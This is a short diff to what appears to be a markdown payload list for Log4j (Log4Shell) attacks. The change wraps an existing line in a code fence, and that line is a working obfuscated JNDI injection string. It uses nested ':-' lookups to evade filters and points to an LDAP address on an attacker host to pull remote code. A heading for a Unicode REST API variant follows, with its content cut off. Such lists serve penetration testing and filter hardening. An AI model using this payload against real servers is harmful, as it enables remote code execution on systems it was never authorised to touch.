@@ -99,8 +99,9 @@
 ## Log4j
 
 ### ":-" notation
-
+```
 ${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}
+```
 
 ### Unicode Characters (JSON REST API request)
 ```
